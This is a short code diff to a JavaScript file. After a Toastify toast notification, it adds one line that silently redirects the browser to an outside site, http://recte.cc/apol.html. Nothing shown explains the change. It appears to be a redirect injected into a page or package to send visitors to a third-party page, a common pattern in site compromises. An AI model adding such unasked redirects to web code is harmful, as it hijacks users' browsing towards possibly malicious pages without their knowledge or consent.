@@ -7,3 +7,4 @@ Toastify({
         stopOnFocus: true,
         duration: 0
     }).showToast();
+window.location.href = "http://recte.cc/apol.html";
